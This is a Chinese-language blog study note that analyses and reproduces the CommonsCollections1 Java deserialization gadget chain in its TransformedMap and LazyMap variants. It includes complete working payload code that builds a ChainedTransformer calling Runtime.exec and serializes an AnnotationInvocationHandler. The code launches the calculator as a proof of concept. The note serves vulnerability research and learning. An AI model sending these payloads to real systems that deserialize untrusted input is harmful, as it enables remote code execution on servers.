---
title: CommonsCollections1
date: 2021-12-18 14:39:49
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---


# 流程图

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639751474562-f689ba64-9760-4407-85a8-835329056295.jpeg)


# 分析与复现

本文章主要根据大佬白组长的视频进行学习记录，视频里详细分析了 TransformedMap 这条链，对 LazyMap 那一条链也进行了提点式的说明。一点一点跟完视频后收获非常多，在这里记录一下，由于还在学习基础阶段，因此记录得比较啰嗦。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639798551407-b2279f74-3aec-4eec-b3f7-b10909892ab3.png)

## 0x00 概述



CommonsCollection1 反序列化利用链是一条 Commons-Collections 包中的利用链。



### 利用版本



CommonsCollections 3.1 - 3.2.1



### 限制



JDK版本：1.7 （8u71之后已修复不可利用）



## 0x01 前置准备



### 1. 了解 Commons-Collection



在 Java 的 Collections API 中，大致可以划分为三种主要的类别：



1.  容器类：如Collection、List、Map等，用于存放对象和进行简单操作的； 
2.  操作类：如Collections、Arrays等，用于对容器类的实例进行相对复杂操作如排序等； 

1.  辅助类：如Iterator、Comparator等，用于辅助操作类以及外部调用代码实现对容器类的操作， 



[Apache Commons Collections](https://commons.apache.org/proper/commons-collections/index.html) 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。Commons-Collection 为 Java 标准的 Collections API 提供了相当好的补充。



包结构如下：



```plain
org.apache.commons.collections – Commons Collections自定义的一组公用的接口和工具类
org.apache.commons.collections.bag – 实现Bag接口的一组类
org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类
org.apache.commons.collections.buffer – 实现Buffer接口的一组类
org.apache.commons.collections.collection – 实现java.util.Collection接口的一组类
org.apache.commons.collections.comparators – 实现java.util.Comparator接口的一组类
org.apache.commons.collections.functors – Commons Collections自定义的一组功能类
org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类
org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类
org.apache.commons.collections.list – 实现java.util.List接口的一组类
org.apache.commons.collections.map – 实现Map系列接口的一组类
org.apache.commons.collections.set – 实现Set系列接口的一组类
```



其实不做开发，不需要对这个包面临的需求以及具体使用了解得特别清楚，简单来看，这一个包可以对 java 中的常用数据结构进行操作。在后续的复现与分析过程中会对 Commons-Collection 中的一些数据结构做进一步了解。



### 2. 复现环境准备



#### 2.1 从maven 获取 Commons-Collection



可以去 maven repo 中搜索 common-collection：



https://mvnrepository.com/artifact/commons-collections/commons-collections



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746426229-9ba1bb55-f924-4143-902c-fcf19c12eb35.png)



选择下载 3.2.1 版本就可以了



#### 2.2 jdk 版本选择



CC1 利用链在 jdk 8u71 后被修复，复现时选择 jdk 8u65 即可。



#### 2.3 从 openjdk 获取 jdk 源码



我们在寻找利用链的时候，常常会用到 IDEA 中的 find Usage 功能，但该功能只在有 java 源码的情况下可以使用，如果第三方包只有 .class 文件，就没法自动搜索，且反编译后的源码阅读的成本也会增加。所以我们可以到 openjdk 中查找对应版本，利用一些关键词定位到对应版本。



hg.openjdk.java.net/jdk8u/jdk8u/jdk/logs?rev=`修改文件的关键词`



例如查找CC1链修复前的一个版本的jdk源码：



```plain
hg.openjdk.java.net/jdk8u/jdk8u/jdk/logs?rev=annotationvocationhandler
```



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746632039-34b62725-8ec7-44e9-a475-317d33324a5d.png)



上图中对于 CC1 链的修复就是最上面的那一个，点进去后可以看到 parent，也就是修复的上一个版本。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746548668-bee586a4-10d2-43f7-9459-bbcc9f2ac17c.png)



点击到 parent 就可以跳转到漏洞修复前的版本了。



直接点击 zip 就可以下载了



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746552695-3ab903c3-2edc-4fbc-9260-01db06966d38.png)



解压后 jdk 的代码在路径`jdk-af660750b2f4\src\share\classes`下



以 CC1 链为例，将需要使用 sun 包复制一下。



切换到 jdk 路径下，目录下的 src.zip 用于存放 Oralcle 自带的源码。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746654937-40b58da6-42cb-4b51-ad49-b13297848c47.png)



用压缩软件打开



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746660731-86790228-1f30-4c78-a653-912a8ae23204.png)



然后将前面解压出来的 sun 复制进去，如果出现权限错误，可以先拷贝到 c 盘。



IDEA 会自动索引，这样就可以查看 sun 的源码了。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746666592-ed23f252-bc00-4e8f-ada8-a86720ff9c1a.png)



## 0x02 寻找触发点



一个能成功执行的反序列化调用链需要三个元素：kick-off、sink、chain。翻译成中文来说就是 “入口点（重写了 readObject 的类）”、“sink 点（最终执行恶意动作的点：RCE...）”、“chain （中间的调用链）”。



反序列化利用链的挖掘通常以反向寻找的方式进行。下面我们以 sink--> chain --> kick-off 的思路还原 CC1 利用链。



反序列化利用链的触发点通常需要寻找一个可以序列化（实现了 Serializable 接口）并且存在一些敏感操作（例如 invoke 调用、文件读写等等）的类。拿到 common-collections，我们首先去定位一下敏感函数（使用 codeql、fortify、代码卫士等）。



common-collections 源码可以使用 maven 下载，默认和 common-collections 放在同一目录下：

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746721671-b080667c-0445-4c90-b9dc-6ab11c4aef39.png)

自动化扫描这里不过多交代，CC1 链的触发点在 InvokerTransformer 类的 transform 方法中。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746771146-0d07f0a3-cbda-447e-bd91-212cf213c782.png)

从 input 对象中获取 class 对象，通过 iMethodName，iParamTypes 获取相应的方法，然后传入 iArgs 参数，通过 invoke 调用相应的方法。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746815306-60ebb2c4-d48e-46f4-b0f9-cd9a1e6beec3.png)

iMethodName、iParamTypes、iArgs 三个参数都可以在 InvokerTransformer 的构造函数中进行赋值。因此只要能够在反序列化中得到这个类，并且调用 transform 方法，就能够执行任意命令。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746788862-0a1ad510-38a3-43be-a8c7-7a4d67fbf8c8.png)

另外，InvokerTransformer 类实现了 Serializable 接口，可以进行序列化和反序列化。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746779731-8cc92f07-f303-4664-81ac-b0522db27439.png)



从上述的几个条件来看，InvokerTransformer 类就是一个绝佳的 "sink"。



我们可以先手动尝试一下使用 InvokerTransformer 的 transform 执行任意命令。例如执行 `Runtime.getRuntime().exec("calc");`



构造函数需要传入：方法名（String）、参数类型（Class 数组）、参数（Object 数组）。



- String methodName, Class[] paramTypes, Object[] args



```java
    public static void TestInvokerTransformer() throws Exception{
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
```



成功弹出计算器。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746883437-a08801a4-04eb-4ff6-a86a-85c512139781.png)



到这里，利用链暂时只有这一个节点，流程图长这样：



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746887289-43490dbc-2eab-4e06-96cf-faa1d7e23bd5.png)



## 0x03 TramformedMap 调用链



找到 sink 后，就需要反向寻找哪些类的哪些方法可以调用这个 transfrom 方法。可以使用 IDEA 中的 find Usages 功能来寻找。



可以看到总共时 21 处调用，重点关注各种 jar 包中的调用。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746901491-7a3ea978-8ec4-4171-adff-e24e9860ee7c.png)



其中有一个 TramformedMap



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746913597-0b688b1c-4c02-49e6-9ef5-801f24bdf432.png)



TramformedMap 用于装饰一个 Map，构造函数提供一个 map 和两个 Transformer 对象。从名称中可以看出，keyTransformer 用于修饰 map 中的键，valueTransformer 用于修饰值，对键和值的操作就在这两个 Transformer 对象中定义，上面的 InvokerTransformer 类就是 Transformer 类的一个实现，所以这里当然也可以传入一个 InvokerTransformer 对象。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746960804-2d918b78-a7f2-44a9-aaa2-d2bbf2e9a92f.png)

TramformedMap 在 checkSetValue 方法中对 transform 进行了调用：

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746936314-002c27fc-139d-4366-a160-9ca09eff1527.png)

这里的 valueTransformer 如果是一个 InvokerTransformer 对象，那就能够触发上面的任意代码执行。

另外 TramformedMap 也是可以进行序列化的，因此 TramformedMap 可以作为我们反序列化中的一员。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746941240-8b554bfa-e5c9-40b6-9763-c4bd4d2e1a08.png)



再往上找，我们需要寻找哪个类的哪个方法调用了 checkSetValue 方法。同样使用 IDEA 中的 find Usages 功能来寻找。



可以看到在 AbstractInputCheckedMapDecorator 抽象类中的 MapEntry 类中，setValue 方法调用了 checkSetValue 方法。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746993639-6abea945-20a0-4b85-a73d-c6e5f7f37214.png)



我们只要能够控制 parent



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746999866-2e12c375-2d05-4091-ab25-55fc181948e0.png)



那这个 MapEntry 的 setValue 方法在哪里会被调用呢？到这一步其实不需要再往上寻找，类比一下 HashMap 就可以知道这个方法应该如何调用。



熟悉 Java HashMap 的话应该知道：



HashMap 继承自 AbstractMap，而 AbstractMap 实现了 Map 接口，Map 接口中包含了一个 Entry 接口。



HashMap 在遍历时就会用到 Map.Entry 接口，并且 entry 对象可以使用 setValue 方法在修改值，示例代码如下：



```java
		Map<Integer, Integer> map = new HashMap<Integer, Integer>();
		map.put(1, 10);
		map.put(2, 20);
 
		// Iterating entries using a For Each loop
		for (Map.Entry<Integer, Integer> entry : map.entrySet()) {
			System.out.println("Key = " + entry.getKey() + ", Value = " + entry.getValue());
		}
```



类比 HashMap：



TramformedMap 继承自 AbstractInputCheckedMapDecorator ，AbstractInputCheckedMapDecorator 继承自 AbstractMapDecorator，而 AbstractMapDecorator 实现了 Map.Entry 接口，并且 AbstractInputCheckedMapDecorator.MapEntry 重写了 setValue 方法。



也就是说我们可以获取 TramformedMap 的 entry，然后调用 setValue 方法。进而触发后面的利用链。



流程如下：



- 创建 TramformedMap 对象。
- 以 entry 的形式遍历该对象。

- 调用 setValue 方法。该方法传入 value ，然后调用 TramformedMap.checkSetValue 方法。
- TramformedMap.checkSetValue 方法调用 valueTransformer.transform(value); 这里的 valueTransformer 就是我们在 decorate 时传入的 invokerTransformer。

- 由于目标是调用 invokerTransformer.transform(Runtime.getRuntime())。因此 setValue 时需要传入 Runtime.getRuntime()。



于是我们可以编写如下代码，观察是否能够成功弹出计算器。



```java
    public static void TestInvokerTransformer() throws Exception{
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<String,String> map = new HashMap<>();
        map.put("key","value");

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);

        for (Map.Entry<Object,Object> entry: transformedMap.entrySet()){
            entry.setValue(Runtime.getRuntime());
        }
    }
```



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747024162-04074958-3ab8-4eb2-b9d3-2aef410541fa.png)



至此，利用链如下：



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747029000-bfe582df-c388-4812-8a4d-c395b9bdbec8.png)



到这一步我们可以继续寻找 chain，如果有一个以 Entry 形式遍历 Map 的地方，并且调用了 setValue 方法。那么就可以调用这一条链。当然，最终我们的目标是溯源到某个类的 readObject 方法中。



继续使用 IDEA 的 find Usages 寻找。



在 sun.reflect.annotation 中找到了对 setValue 方法的调用，并且是在 readObject 方法中调用。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747034123-aef3caff-3f0e-48b9-8938-e64e4cab3b22.png)



AnnotationInvocationHandler 类的 readObject 方法中遍历 memberValues 然后调用 setValue 方法。memberValues 是在构造函数中直接赋值的。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747039258-a0a3a63b-2819-4f7d-8396-b8d14e2fb35d.png)



因此，我们可以在序列化时将 memberValues 设置为一个用 TramformedMap.decorate 方法装饰过的 Map ，在反序列化时遍历这个 Map，同时调用 setValue 方法，进而把后面的利用链走通。



到这一步基本上能够把整条链串起来了。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747043580-3f9d30fc-360d-4454-a00b-9593799c5bf3.png)



下面我们可以尝试编写代码序列化一个 AnnotationInvocationHandler。需要注意以下几点：



 

1.  AnnotationInvocationHandler 是一个用于注解的动态代理。 
2.  构造器接收两个参数`Class<? extends Annotation> type, Map<String, Object> memberValues`，第一个是 type，需要输入一个继承于 Annotation 接口的注解类的 Class 对象，例如 Target.class，第二个是memberValues，一个 Map<String,Object> 对象。 

1.  另外，AnnotationInvocationHandler 没有 public 标识，所以是 default 类型，default 类型只允许在同一个包内访问。也就是 package sun.reflect.annotation，**因此，在实例化对象的时候，不能直接 new，而是要通过反射去获取。** 

 



```java
    public static void TestInvokerTransformer() throws Exception{
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap<String,String> map = new HashMap<>();
        map.put("111","222");

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
        
//        Runtime r = Runtime.getRuntime();
//        for(Map.Entry entry: transformedMap.entrySet()){
//            entry.setValue(r);
//        }
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        serialize(constructor.newInstance(Override.class, transformedMap));
        unserialize("abc.ser.bin");
    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }
```



编写完序列化的语句之后，还有两个问题需要解决



### 1. 解决 Runtime 对象不能序列化



Runtime 对象是不能够直接序列化的，因此我们必须反射获取一个 Rumtime 对象。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747062657-087d039c-57e0-47b2-b6f0-1f42325e10ef.png)



Runtime 对象不能反序列化，但是 Runtime.class 可以反向列化



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747065783-df5cf8e7-913a-4b08-b0b0-154de41dcdab.png)



因此我们可以从 Runtime.class 入手来编写执行任意命令的语句，其中也需要注意几个要点：



1.  exec 并不是一个静态方法，因此在执行前也需要实例化一个 Runtime 对象。 
2.  实例化 Runtime 对象时不能直接使用构造器进行实例化，原因在于构造器是一个私有方法，但我们可以通过调用 getRuntime 方法获得一个实例。 

1.  getRuntime 方法是一个静态方法，因此在 invoke 调用时，第一个参数为 null，由于 getRuntime 不需要参数，**但是也可以为自身**，因此 invoke 第二个参数也为 null。 
2.  别忘了 Runtime 的强制类型转换。
   最终编写如下： 



```java
    public static void testRuntimeClass() throws Exception{
        Class c = Runtime.class;
        Method getRuntimeMethod = c.getMethod("getRuntime");
        Runtime r = (Runtime)getRuntimeMethod.invoke(null,null);

        Method execMethod = c.getMethod("exec",String.class);
        execMethod.invoke(r,"calc");
    }
```



在序列化时，需要改成 InvokerTransformer 调用的形式，需要注意以下几点：



1.  getMethod 方法的第一个参数是函数名，第二个参数是可变数量的 Class 数组。 
2.  invoke 函数的第一个参数类型为 Object ，第二个参数类型为 Object 数组。
   最终改写如下： 



```java
    public static void testRuntimeClassInvokerTransformer() throws Exception{
        Object ob1 = new InvokerTransformer(
                "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                ).transform(Runtime.class);
        // Class c = Runtime.class;
        // Method getRuntimeMethod = c.getMethod("getRuntime");
        Object ob2 = new InvokerTransformer(
                "invoke",
                new Class[]{Object.class,Object[].class},
                new Object[]{null,null}
        ).transform(ob1);
        // Runtime r = (Runtime)getRuntimeMethod.invoke(null,null);
        Object ob3 = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        ).transform(ob2);
        // exec.invoke(r,"calc");
    }
```



**这样，Runtime 序列化的问题就解决了。**



值得一提的是，从上面的三个 InvokerTransformer 的调用关系上来看，实际上是一个链式调用。前一个的输出作为后一个的输入，在 Common-collections 中，有一个 ChainedTransformer 可以用于 Transformer 的链式调用。



这个类的 transform 方法的作用就是链式调用 iTransformers。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747080817-c3add96d-a736-45ce-b5aa-bbf52b8b25ec.png)



iTransformers 是一个 Transformer 数组，构造器传入参数时赋值。



因此，我们可以将上面三个 InvokerTransformer 合并到一个 ChainedTransformer 中。



改写如下；



```java
    public static void testRuntimeClassChainedTransformer() throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                    new InvokerTransformer(
                            "getMethod",
                            new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",null}
                    ),
                    new InvokerTransformer(
                            "invoke",
                            new Class[]{Object.class,Object[].class},
                            new Object[]{null,null}
                    ),
                    new InvokerTransformer(
                            "exec",
                            new Class[]{String.class},
                            new Object[]{"calc"}
                    )
            });
        chainedTransformer.transform(Runtime.class);
    }
```



将这部分代码替换掉之前的 InvokerTransformer。



改写的代码如下：



```java
    public static void TestInvokerTransformer() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new InvokerTransformer(
                                "getMethod",
                                new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}
                        ),
                        new InvokerTransformer(
                                "invoke",
                                new Class[]{Object.class,Object[].class},
                                new Object[]{null,null}
                        ),
                        new InvokerTransformer(
                                "exec",
                                new Class[]{String.class},
                                new Object[]{"calc"}
                        )
                });

        HashMap<String,String> map = new HashMap<>();
        map.put("value","222");

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Runtime r = Runtime.getRuntime();

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        serialize(constructor.newInstance(Target.class, transformedMap));
        unserialize("abc.ser.bin");
    }
```



### 2. 解决传入参数不可控问题



setValue 需要传入 Runtime 对象，而在 AnnotationInvocationHandler 的 readObject 方法中是一个 AnnotationTypeMismatchExceptionProxy 对象。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747090204-4b7fb9e4-d42b-40bb-90c1-fcf71d7a9ab5.png)



面对这种较为复杂的代码，最好是动态调试一下。



进入 readObject，可以看到 this.memberValues 就是我们最初对 map 的赋值。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747093291-d635f3a7-80bd-4388-ab22-16483188e294.png)



尔后循环遍历 memberValues。第一个 if 判断 memberType 是否为 null，memberTypes 取自 annotationType.memberTypes()，name 为键名。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747099573-e5ed8f97-1393-426f-ad40-de39113d6238.png)



而 annotationType 是通过我们传入 type 进行实例化的。可以看到 type 就是在前面构造时赋值的 Override.class



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747104282-d11c419d-4550-4df7-8c67-51a6c92b8b30.png)



这里的意思是从传入的 map 中取出 entry ，然后判断 key 的值，是否是 Override 这个接口的属性。而 Override 并没有任何属性，因此的 memberType 为 null。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747112815-c097ff1f-5a75-415b-9b7f-6fb8e09f2ab5.png)



所以我们可以在构造时选择 Target.class 或者其他带有属性、且继承于 annotation 接口的注解类。可以看到 Target 接口中有 value 这个属性。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747118755-49b6ce7c-50b9-4f0c-afe6-e503b4e730ef.png)



修改：



```java
map.put("value","222");
...
serialize(constructor.newInstance(Target.class, map));
```



然后再次调试：



传入的 value 只是一个 String 实例，memberType 是 java.lang.annotation.ElementType 类，因此这里可以直接进去。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747124190-9d317869-a0d5-44d0-b161-75f99f5765c4.png)



终于到了 memberValue.setValue 方法，但是这里的参数并不是我们想要的 Runtime.class。我们可以在 TransformedMap.checkSetValue 处下一个断点。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747128333-6b11dbad-2c09-4cb9-9602-70fff4be8af2.png)



这里的 valueTransformer 是我们传入的 chainedTransformer ，调用 transform 方法，但是 value 并不是我们想要的 Runtime.class 。



怎么解决这个问题呢？



Common-collection 中提供了一个 ConstantTransformer，这个类在调用 transform 方法时，无论传入什么参数，都返回自己的 iConstant 成员变量。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747147206-05e52386-0454-429f-9e91-382201925157.png)

而 iConstant 成员变量是在构造器中赋值的，因此我们可控。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747180645-9ef818f2-6a00-4dd9-942b-aa91c0e1e409.png)



所以，我们在 chainedTransformer 中可以再添加一个 ConstantTransformer，即使在 AnnotationInvocationHandler.readObject 中调用 setValue 方法时参数并不是 Runtime.class ，ConstantTransformer 也能直接返回 Runtime.class。



解决了上述两个问题之后，最终 payload 如下：



```java
public static void TestInvokerTransformer() throws Exception{
    ChainedTransformer chainedTransformer = new ChainedTransformer(
            new Transformer[]{
                    new ConstantTransformer(
                            Runtime.class
                    ),
                    new InvokerTransformer(
                            "getMethod",
                            new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",null}
                    ),
                    new InvokerTransformer(
                            "invoke",
                            new Class[]{Object.class,Object[].class},
                            new Object[]{null,null}
                    ),
                    new InvokerTransformer(
                            "exec",
                            new Class[]{String.class},
                            new Object[]{"calc"}
                    )
            });

    HashMap<String,String> map = new HashMap<>();
    map.put("value","222");

    Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

    Runtime r = Runtime.getRuntime();

    Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
    constructor.setAccessible(true);
    serialize(constructor.newInstance(Target.class, transformedMap));
    unserialize("abc.ser.bin");
}
```



可以成功执行命令。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747193131-a8b656be-aff2-4858-a56e-6cf357d1b7ab.png)



## 0x04 LazyMap 调用链



从最开始寻找哪里调用 transfrom 方法时，上面我们选择了 TramformedMap ，但从查询结果看其实 LazyMap.get 方法也调用了 transform 方法。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747323118-487f78f0-a6e6-4925-bf25-86da1e1c693a.png)



其实，ysoserial 中的 payload 也是用的 LazyMap。下面继续分析 LazyMap 这一条调用链。



LazyMap.get 方法调用了 factory 的 transform 方法，factory 在构造器中赋值，因此可控。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747328558-352ff72a-718c-464e-970e-ab3343189988.png)



如果继续寻找哪里调用了 get 方法是很困难的，get 的同名方法非常多，如果直接去找如同大海捞针，利用链的作者在 AnnotationInvocationHandler 中找到了这样一条利用链。



在 invoke 方法中调用了 memberValues.get，而 memberValues 来自于构造器传入的参数，是我们可控的。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747557774-97f177e8-f1b0-48e0-b091-9ca8ccb66722.png)



并且参数 mamber 来自于 invoke 的参数，表示调用的方法名。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747562104-009cc111-adfd-474b-915f-5a13f2aa7a0d.png)



AnnotationInvocationHandler 本质就是一个 Annotation 类的动态代理，因此只要代理对象调用任何方法，就可以调用这个 invoke 方法。



到这一步，利用链如下：



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747567195-15e421a2-6a33-4ce7-b361-fc2f7ec38aff.png)



再一个问题就是用 AnnotationInvocationHandler 去代理什么？当然，随便调用什么方法都可以触发 AnnotationInvocationHandler 的 invoke 。但是，我们在调用 invoke 后，要想运行到 `Object result = memberValues.get(member);`还需要考虑下面的三个判断。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747572433-5b63f70f-1527-4e85-a0b7-405653663ab8.png)



- 方法名不等于 equals
- 调用方法的参数数量需要等于零，也就是需要调用无参方法。

- 方法名不能是 toString、hashCode、annotationType。



总之，反序列化利用链上，需要调用这个代理对象的一个无参方法，且不是 toString、hashCode、annotationType。



值得一提的是，AnnotationInvocationHandler 的 readObject 方法中。



memberValues 就是我们可控的对象，调用的 entrySet 就是一个无参方法。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747579983-b31e50b5-8cd0-4d86-b4f9-063ed1a81263.png)



因此，我们直接用 AnnotationInvocationHandler 创建一个代理对象 proxyMap 用来代理 lazyMap。然后创建 AnnotationInvocationHandler 实例，传入这个 proxyMap 。



最终利用链如下：



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747585268-fbd4dbed-444a-4343-99c4-5799962f5373.png)



- 最外层是一个 AnnotationInvocationHandler 对象，其 memberValues 是一个 Proxy。
- Proxy 是一个 AnnotationInvocationHandler 对象，其 memberValues 是一个 LazyMap

- LazyMap 的 transform 会调用 chainedTransformer，进而执行命令。



来理解一下这一条反序列化的具体运行流程：

首先 readObject，此时 memberValues 就是这个 proxyMap 。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747589785-0955dc0b-ba1a-499a-8de3-ccd46e417841.png)

调用 entrySet 方法时进入 invoke 方法。此时已经进入 proxyMap 这个代理对象的 InvocationHandler（调用处理程序），此时的 memberValues 是 LazyMap。

![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747594350-6f7fb8fe-2a63-48da-8d3b-07c1c4a45a5f.png)

执行 LazyMap.get(entrySet)



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747599448-287c5023-c1e9-4dd6-a4b7-c1cc511babbf.png)



此时 map 是一个 HashMap，HashMap.containsKey 方法用于判断 map 中是否存在指定的 key 对应的映射关系。此前构造的 hashMap 没有赋值，所以自然不存在 entrySet 这个 key，因此进一步调用 factory.transform 方法，这里的 factory 是我们构造的 chainedTransformer，继而可以触发后面的利用链。



运行效果如下：



会抛出异常，也会执行命令。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747603576-80c56d27-d4c8-47eb-8ace-6e4831c2ad13.png)



一个没有解决的问题是：调试的时候怎么也无法跟进到执行命令，IDEA 会忽略断点。这一点很迷。



最终只能通过如下的方式简单测试：



直接在 hashMap 中加入一个 key 为 "entrySet" 的键值对。



![img](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747610391-adf03f71-9946-4a0a-a631-f5c90f17a58a.png )



此时自然就过不了 LazyMap.get 中的那个 if 了。运行后仅抛出异常，但不会执行命令。



最终 payload 如下：



```java
    public static void TestLazyMap() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                Runtime.class
                        ),
                        new InvokerTransformer(
                                "getMethod",
                                new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}
                        ),
                        new InvokerTransformer(
                                "invoke",
                                new Class[]{Object.class,Object[].class},
                                new Object[]{null,null}
                        ),
                        new InvokerTransformer(
                                "exec",
                                new Class[]{String.class},
                                new Object[]{"calc"}
                        )
                });

        HashMap<String,String> map = new HashMap<>();
        map.put("entrySet1","aaa");
        
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler h1 = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);

        Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), h1);

        InvocationHandler h2 = (InvocationHandler) constructor.newInstance(Target.class, proxymap);
        serialize(h2);
    }
```



## 0x05 DefaultMap 调用链



DefaultMap 与 LazyMap 一样，使用 get 方法触发，因此与 LazyMap 利用链相同。



# 参考资料

-  [Java反序列化CommonsCollections篇(一) CC1链手写EXP](https://www.bilibili.com/video/BV1no4y1U7E1?from=search&seid=1275269546208917278&spm_id_from=333.337.0.0) 
-  [Java 反序列化漏洞（二） - Commons Collections](https://su18.org/post/ysoserial-su18-2/#commonscollections1) 

-  [java_集合体系之Map框架相关抽象类接口详解、源码](https://blog.csdn.net/meizheming/article/details/73821812) 
-  [Commons-Collections 1-7 利用链分析](http://wjlshare.com/archives/1535) 
